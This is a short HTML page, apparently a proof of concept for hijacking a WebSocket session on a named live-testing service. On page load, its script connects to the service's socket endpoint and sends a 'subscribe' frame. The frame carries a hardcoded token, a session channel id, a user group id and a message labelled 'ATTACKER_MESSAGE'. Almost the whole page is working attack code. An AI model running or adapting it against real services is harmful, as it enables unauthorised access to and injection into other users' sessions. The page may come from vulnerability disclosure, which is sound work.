<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket Example</title>
</head>
<body>

<button onclick="sendWebSocketMessage()">Send WebSocket Message</button>

<script>
    var ws = new WebSocket('wss://pusher-live.browserstack.com/socket.io/?EIO=3&transport=websocket');

    ws.onopen = function() {
        console.log('WebSocket connection opened');
        ws.send("42[\"subscribe\",\"{\"token\":\"hd8qffsjbht765ff\",\"channel\":\"bs_live_session_7894948\",\"service\":\"https://pusher-live.browserstack.com\",\"type\":\"live_dashboard\",\"channels\":[\"live_global_channel\"],\"prefix\":\"\",\"reconnects\":0,\"is_bridge_cloud_user\":false,\"user_group_id\":\"7790756\",\"message\":\"This is ATTACKER_MESSAGE\",\"userAgent\":\"Gecko/20100101 Firefox/119.0\"}]"); 
    };

    ws.onmessage = function(event) {
        console.log('Received message from server:', event.data);
    };

    ws.onerror = function(error) {
        console.error('WebSocket Error:', error);
    };

    ws.onclose = function() {
        console.log('WebSocket connection closed');
    };

    function sendWebSocketMessage() {
        ws.send("Hello Server!");
    }
</script>

</body>
</html>
